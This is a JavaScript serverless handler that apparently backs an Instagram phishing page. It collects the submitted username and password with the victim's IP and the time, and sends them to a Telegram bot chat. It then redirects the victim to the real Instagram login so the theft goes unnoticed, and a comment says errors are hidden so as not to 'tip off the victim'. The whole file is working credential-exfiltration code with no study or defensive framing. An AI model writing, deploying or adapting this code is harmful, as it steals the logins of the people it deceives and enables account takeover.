export default async function handler(req, res) {
    // Only allow POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const { username, password } = req.body;
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.connection?.remoteAddress || 'unknown';
    const ua = req.headers['user-agent'] || 'unknown';
    const ts = new Date().toISOString();

    const text = `🎯 New Instagram Credentials!\n\n👤 Username: ${username}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n🕐 Time: ${ts}`;

    try {
        // Read from environment variables instead of hardcoding
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (BOT_TOKEN && CHAT_ID) {
            await fetch(
                `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`
            );
        }
    } catch (e) {
        // Silently fail — don't tip off the victim
        console.error('Telegram error:', e);
    }

    // Redirect to real Instagram
    res.writeHead(302, { Location: 'https://www.instagram.com/accounts/login/' });
    res.end();
}